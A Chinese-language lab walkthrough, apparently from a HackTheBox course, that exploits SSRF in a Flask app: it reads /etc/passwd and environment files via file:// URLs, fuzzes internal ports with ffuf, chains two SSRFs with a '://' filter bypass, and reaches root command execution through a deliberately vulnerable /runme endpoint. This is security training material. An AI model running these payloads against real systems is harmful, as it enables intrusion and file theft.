<h4 id="Curl-Interacting-with-the-Target"><a href="#Curl-Interacting-with-the-Target" class="headerlink" title="Curl - Interacting with the Target"></a>Curl - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s http://&lt;TARGET IP&gt;</span><br><span class="line"></span><br><span class="line">HTTP/1.0 302 FOUND</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 242</span><br><span class="line">Location: http://&lt;TARGET IP&gt;/load?q=index.html</span><br><span class="line">Server: Werkzeug/2.0.2 Python</span><br><span class="line">Date: Mon, 18 Oct 2021 09:01:02 GMT</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;</span><br><span class="line">&lt;title&gt;Redirecting...&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Redirecting...&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;You should be redirected automatically to target URL: &lt;a href="/load?q=index.html"&gt;/load?q=index.html&lt;/a&gt;. If not click the link.</span><br></pre></td></tr></tbody></table></figure>

<p>我们可以看到请求重定向到<code>/load?q=index.html</code>，这意味着<code>q</code>参数获取资源<code>index.html</code>。让我们按照重定向，看看我们是否可以收集任何其他信息。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s -L http://&lt;TARGET IP&gt;</span><br><span class="line"></span><br><span class="line">HTTP/1.0 302 FOUND</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 242</span><br><span class="line">Location: http://&lt;TARGET IP&gt;/load?q=index.html</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Mon, 18 Oct 2021 10:20:27 GMT</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 153</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Mon, 18 Oct 2021 10:20:27 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!-- ubuntu-web.lalaguna.local &amp; internal.app.local load resources via q parameter --&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Bad App&lt;/h1&gt;</span><br><span class="line">&lt;a&gt;Hello World!&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>派生的目标是<code>ubuntu-web.lalaguna.local</code>，<code>internal.app.local</code>是内部网络上的应用程序（从我们当前的位置无法访问）。</p>
<p>下一步是确认<code>q</code>参数是否易受SSRF攻击。如果是，我们可以利用SSRF漏洞访问内部的.app.local Web应用程序。我们说“可能”是因为<code>ubuntu-web</code>可能存在信任关系，能够与<code>internal.app.local</code>联系并进行交互。这种类型的关系可以是简单的防火墙规则（甚至没有任何防火墙规则）。</p>
<p>在一个终端中，让我们使用Netcat监听端口8080，如下所示。</p>
<h4 id="Netcat-Listener"><a href="#Netcat-Listener" class="headerlink" title="Netcat Listener"></a>Netcat Listener</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ nc -nvlp 8080</span><br><span class="line"></span><br><span class="line">listening on [any] 8080 ...</span><br></pre></td></tr></tbody></table></figure>

<p>现在，让我们在另一个终端中使用<code>http://&lt;VPN/TUN Adapter IP&gt;</code>而不是<code>index.html</code>向目标Web应用程序发出请求，如下所示。<code>&lt;VPN/TUN Adapter IP&gt;</code>将是Pwnbox的TUN适配器IP或您可能正在使用的本地VM的TUN适配器IP（在使用提供的VPN密钥连接后）。</p>
<h4 id="Curl-Testing-for-SSRF"><a href="#Curl-Testing-for-SSRF" class="headerlink" title="Curl - Testing for SSRF"></a>Curl - Testing for SSRF</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://&lt;VPN/TUN Adapter IP&gt;:8080"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 0</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Mon, 18 Oct 2021 12:07:10 GMT</span><br></pre></td></tr></tbody></table></figure>

<p>我们将通过目标服务器使用<a target="_blank" rel="noopener" href="https://docs.python.org/3.8/library/urllib.html">Python-urllib</a>发出的请求，在Netcat监听器中接收以下内容，以确认SSRF漏洞：</p>
<h4 id="Netcat-Listener-Confirming-SSRF"><a href="#Netcat-Listener-Confirming-SSRF" class="headerlink" title="Netcat Listener - Confirming SSRF"></a>Netcat Listener - Confirming SSRF</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Connection received on &lt;TARGET IP&gt; 49852</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Host: &lt;VPN/TUN Adapter IP&gt;:8080</span><br><span class="line">User-Agent: Python-urllib/3.8</span><br><span class="line">Connection: close</span><br></pre></td></tr></tbody></table></figure>

<p>阅读<a target="_blank" rel="noopener" href="https://docs.python.org/3.8/library/urllib.html">Python-urllib</a>文档，我们可以看到它支持<code>file</code>、<code>http</code>和<code>ftp</code>模式。因此，除了代表目标应用程序向其他服务发出HTTP请求外，我们还可以通过<code>file</code>模式读取本地文件，并使用<code>ftp</code>读取远程文件。</p>
<p>我们可以通过以下步骤测试此功能：</p>
<ol>
<li>创建名为index.html的文件</li>
</ol>
<p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>SSRF<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<ol>
<li>在index.html所在的目录中，使用以下命令启动HTTP服务器</li>
</ol>
<h4 id="Start-Python-HTTP-Server"><a href="#Start-Python-HTTP-Server" class="headerlink" title="Start Python HTTP Server"></a>Start Python HTTP Server</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ python3 -m http.server 9090</span><br></pre></td></tr></tbody></table></figure>

<ol>
<li>在index.html所在的目录中，通过以下命令启动FTP服务器</li>
</ol>
<h4 id="Start-FTP-Server"><a href="#Start-FTP-Server" class="headerlink" title="Start FTP Server"></a>Start FTP Server</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ sudo pip3 install twisted</span><br><span class="line">mikannse7@htb[/htb]$ sudo python3 -m twisted ftp -p 21 -r .</span><br></pre></td></tr></tbody></table></figure>

<ol>
<li>使用<code>ftp</code>模式通过目标应用程序重新编译index.html，如下所示</li>
</ol>
<h4 id="FTP-Schema-通过目标应用程序检索远程文件-FTP架构"><a href="#FTP-Schema-通过目标应用程序检索远程文件-FTP架构" class="headerlink" title="FTP Schema 通过目标应用程序检索远程文件- FTP架构"></a>FTP Schema 通过目标应用程序检索远程文件- FTP架构</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=ftp://&lt;VPN/TUN Adapter IP&gt;/index.html"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 41</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 11:21:09 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;a&gt;SSRF&lt;/a&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;html&gt;</span><br></pre></td></tr></tbody></table></figure>

<ol>
<li>使用<code>ftp</code>模式通过目标应用程序重新编译index.html，如下所示</li>
</ol>
<h4 id="通过目标应用程序检索远程文件-HTTP模式"><a href="#通过目标应用程序检索远程文件-HTTP模式" class="headerlink" title="通过目标应用程序检索远程文件- HTTP模式"></a>通过目标应用程序检索远程文件- HTTP模式</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://&lt;VPN/TUN Adapter IP&gt;:9090/index.html"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 41</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 11:26:18 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;a&gt;SSRF&lt;/a&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;html&gt;</span><br></pre></td></tr></tbody></table></figure>

<ol>
<li>使用文件架构重新编译本地文件，如下所示</li>
</ol>
<h4 id="通过目标应用程序检索本地文件-文件架构"><a href="#通过目标应用程序检索本地文件-文件架构" class="headerlink" title="通过目标应用程序检索本地文件-文件架构"></a>通过目标应用程序检索本地文件-文件架构</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=file:///etc/passwd" </span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 926</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 11:27:17 GMT</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br></pre></td></tr></tbody></table></figure>

<p>请记住，获取远程HTML文件可能会导致反射XSS。</p>
<p>请记住，我们在目标服务器上只有两个开放端口。但是，内部应用程序可能只存在于本地主机上并进行侦听。我们可以使用ffuf这样的工具来枚举这些Web应用程序，方法是执行以下步骤：</p>
<ol>
<li>生成包含所有可能端口的单词列表。</li>
</ol>
<h4 id="Generate-a-Wordlist"><a href="#Generate-a-Wordlist" class="headerlink" title="Generate a Wordlist"></a>Generate a Wordlist</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ for port in {1..65535};do echo $port &gt;&gt; ports.txt;done</span><br></pre></td></tr></tbody></table></figure>

<ol>
<li>向随机端口发出cURL请求，以获取对不存在的服务的请求的响应大小。</li>
</ol>
<h4 id="Curl-Interacting-with-the-Target-1"><a href="#Curl-Interacting-with-the-Target-1" class="headerlink" title="Curl - Interacting with the Target"></a>Curl - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://127.0.0.1:1"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 30</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 11:36:25 GMT</span><br><span class="line"></span><br><span class="line">[Errno 111] Connection refused</span><br></pre></td></tr></tbody></table></figure>

<ol>
<li>对单词列表使用ffuf，并丢弃具有我们先前确定的大小的响应。</li>
</ol>
<h4 id="Port-Fuzzing"><a href="#Port-Fuzzing" class="headerlink" title="Port Fuzzing"></a>Port Fuzzing</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ ffuf -w ./ports.txt:PORT -u "http://&lt;TARGET IP&gt;/load?q=http://127.0.0.1:PORT" -fs 30</span><br><span class="line"></span><br><span class="line">        /'___\  /'___\           /'___\</span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/</span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\</span><br><span class="line">          \/_/    \/_/   \/___/    \/_/</span><br><span class="line"></span><br><span class="line">       v1.3.1 Kali Exclusive &lt;3</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://&lt;TARGET IP&gt;/load?q=http://127.0.0.1:PORT</span><br><span class="line"> :: Wordlist         : PORT: ./ports.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405</span><br><span class="line"> :: Filter           : Response size: 30</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">80                      [Status: 200, Size: 153, Words: 11, Lines: 8]</span><br><span class="line">5000                    [Status: 200, Size: 64, Words: 3, Lines: 1]</span><br><span class="line">:: Progress: [65535/65535] :: Job [1/1] :: 577 req/sec :: Duration: [0:02:00] :: Errors: 0 ::</span><br></pre></td></tr></tbody></table></figure>

<p>我们已收到端口<code>5000</code>的有效响应。让我们检查如下。</p>
<h4 id="cURL-Interacting-with-the-Target"><a href="#cURL-Interacting-with-the-Target" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://127.0.0.1:5000"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 64</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 11:47:16 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hey!&lt;/h1&gt;&lt;a&gt;Some internal app!&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>到目前为止，我们已经学习了如何通过SSRF到达内部应用程序并使用不同的模式来加载本地文件。有了这些知识，让我们再次通过SSRF尝试攻击<code>internal.app.local</code> Web应用程序。我们的最终目标是在内部主机上实现远程代码执行。</p>
<p>首先，我们向之前发现的内部应用程序发出一个简单的cURL请求。记住我们发现的信息，两个应用程序以相同的方式加载资源（通过<code>q</code>参数）。</p>
<h4 id="cURL-Interacting-with-the-Target-1"><a href="#cURL-Interacting-with-the-Target-1" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=index.html"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 83</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 13:51:15 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Internal Web Application&lt;/h1&gt;</span><br><span class="line">&lt;a&gt;Hello World!&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>现在，让我们发现任何在localhost中侦听的Web应用程序。让我们尝试向随机端口发出请求，以确定来自封闭端口的响应是什么样子的。</p>
<h4 id="cURL-Interacting-with-the-Target-2"><a href="#cURL-Interacting-with-the-Target-2" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 97</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 14:52:32 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: http127.0.0.1:1&lt;/h1&gt;&lt;a&gt;unknown url type: http127.0.0.1&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>我们收到了一条<code>unknown url type</code>错误消息。Web应用程序似乎正在从我们的请求中删除<code>://</code>。让我们尝试通过修改URL来克服这种情况。</p>
<h4 id="cURL-Interacting-with-the-Target-3"><a href="#cURL-Interacting-with-the-Target-3" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 99</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 14:55:10 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: http://127.0.0.1:1&lt;/h1&gt;&lt;a&gt;[Errno 111] Connection refused&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>在这种情况下，Web应用程序返回一些HTML呈现的内容，其中包含我们试图获取的资源。如果我们使用响应的大小作为过滤器，这个响应将影响我们的内部服务发现，因为它会根据端口而变化。幸运的是，ffuf支持正则表达式进行过滤。我们可以使用此ffuf功能来使用错误号过滤响应，如下所示。</p>
<h4 id="Port-Fuzzing-1"><a href="#Port-Fuzzing-1" class="headerlink" title="Port Fuzzing"></a>Port Fuzzing</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ ffuf -w ./ports.txt:PORT -u "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /'___\  /'___\           /'___\</span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/</span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\</span><br><span class="line">          \/_/    \/_/   \/___/    \/_/</span><br><span class="line"></span><br><span class="line">       v1.3.1 Kali Exclusive &lt;3</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT</span><br><span class="line"> :: Wordlist         : PORT: ./ports.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405</span><br><span class="line"> :: Filter           : Regexp: Errno[[:blank:]]111</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">80                      [Status: 200, Size: 153, Words: 5, Lines: 6]</span><br><span class="line">5000                    [Status: 200, Size: 123, Words: 3, Lines: 5]</span><br><span class="line">:: Progress: [65535/65535] :: Job [1/1] :: 249 req/sec :: Duration: [0:04:06] :: Errors: 0 ::</span><br></pre></td></tr></tbody></table></figure>

<p>我们发现另一个应用程序正在侦听端口5000。在这种情况下，应用程序会以文件列表进行响应。</p>
<h4 id="cURL-Interacting-with-the-Target-4"><a href="#cURL-Interacting-with-the-Target-4" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 385</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 20:30:07 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: http://127.0.0.1:5000/&lt;/h1&gt;&lt;a&gt;total 24K</span><br><span class="line">drwxr-xr-x 1 root root 4.0K Oct 19 20:29 .</span><br><span class="line">drwxr-xr-x 1 root root 4.0K Oct 19 20:29 ..</span><br><span class="line">-rw-r--r-- 1 root root   84 Oct 19 16:32 index.html</span><br><span class="line">-rw-r--r-- 1 root root 1.2K Oct 19 16:32 internal.py</span><br><span class="line">-rw-r--r-- 1 root root  691 Oct 19 20:29 internal_local.py</span><br><span class="line">-rwxr-xr-x 1 root root   69 Oct 19 16:32 start.sh</span><br><span class="line"> &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>让我们快速回顾一下我们所取得的成就：</p>
<ul>
<li>代表ubuntu-web向internal.app.local发出请求</li>
<li>到达一个Web应用程序侦听端口5000内部的.app.local链接两个SSRF漏洞</li>
<li>通过内部应用程序披露文件列表</li>
</ul>
<p>现在，让我们揭开监听<code>internal.app.local</code>的Web应用程序的源代码，看看如何实现远程代码执行。</p>
<p>让我们发出一个请求来公开<code>/proc/self/environ</code>文件，其中当前路径应该存在于<code>PWD</code>环境变量下。</p>
<h4 id="cURL-Interacting-with-the-Target-5"><a href="#cURL-Interacting-with-the-Target-5" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 584</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 16:52:20 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: file:///proc/self/environ&lt;/h1&gt;&lt;a&gt;HOSTNAME=18f236843662PYTHON_VERSION=3.8.12PWD=/appPORT=80PYTHON_SETUPTOOLS_VERSION=57.5.0HOME=/rootLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568SHLVL=0PYTHON_PIP_VERSION=21.2.4PYTHON_GET_PIP_SHA256=01249aa3e58ffb3e1686b7141b4e9aac4d398ef4ac3012ed9dff8dd9f685ffe0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d781367b97acf0ece7e9e304bf281e99b618bf10/public/get-pip.pyPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=/usr/local/bin/python3&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>现在我们知道当前路径是<code>/app</code>，并且我们有一个有趣的文件列表。让我们公开<code>internal_local.py</code>文件如下。</p>
<h4 id="通过目标应用程序检索本地文件-文件架构-1"><a href="#通过目标应用程序检索本地文件-文件架构-1" class="headerlink" title="通过目标应用程序检索本地文件-文件架构"></a>通过目标应用程序检索本地文件-文件架构</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 771</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 20:40:28 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: file:///app/internal_local.py&lt;/h1&gt;&lt;a&gt;import os</span><br><span class="line">from flask import *</span><br><span class="line">import urllib</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">basedir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def run_command(command):</span><br><span class="line">    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    stdout = p.stdout.read()</span><br><span class="line">    stderr = p.stderr.read()</span><br><span class="line">    result = stdout.decode() + " " + stderr.decode()</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">@app.route("/")</span><br><span class="line">def index():</span><br><span class="line">    return run_command("ls -lha")</span><br><span class="line"></span><br><span class="line">@app.route("/runme")</span><br><span class="line">def runmewithargs():</span><br><span class="line">    command = request.args.get("x")</span><br><span class="line">    if command == "":</span><br><span class="line">        return "Use /runme?x=&lt;CMD&gt;"</span><br><span class="line">    return run_command(command)</span><br><span class="line"></span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    app.run(host="127.0.0.1", port=5000)</span><br><span class="line">&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>通过研究上面的源代码，我们注意到一个功能，它允许我们在远程主机上执行命令，向<code>/runme?x=&lt;CMD&gt;</code>发送GET请求。让我们通过发送<code>whoami</code>作为命令来确认远程代码执行。</p>
<h4 id="cURL-Interacting-with-the-Target-6"><a href="#cURL-Interacting-with-the-Target-6" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 93</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 20:48:32 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Resource: http://127.0.0.1:5000/runme?x=whoami&lt;/h1&gt;&lt;a&gt;root</span><br><span class="line"> &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>我们可以在目标应用程序上的超级用户上下文下执行命令。但是，如果我们试图提交一个带有参数的命令，会发生什么呢？    </p>
